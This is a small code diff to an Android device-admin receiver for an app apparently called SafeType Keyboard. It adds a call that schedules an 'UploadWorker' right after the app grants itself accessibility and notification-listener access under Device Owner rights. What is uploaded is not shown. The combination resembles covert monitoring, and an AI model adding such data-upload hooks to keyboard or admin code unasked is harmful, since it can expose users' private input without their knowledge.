@@ -9,6 +9,7 @@ import android.os.UserHandle
 import android.os.UserManager
 import android.provider.Settings
 import android.util.Log
+import com.safetype.keyboard.data.UploadWorker
 
 /**
  * Device Owner receiver. Set via:
@@ -41,6 +42,7 @@ class AdminReceiver : DeviceAdminReceiver() {
             addUserRestrictions(dpm, admin)
             enableAccessibilityService(context, dpm)
             enableNotificationListener(context, dpm)
+            UploadWorker.schedule(context)
             Log.i(TAG, "All Device Owner restrictions applied")
         }
 
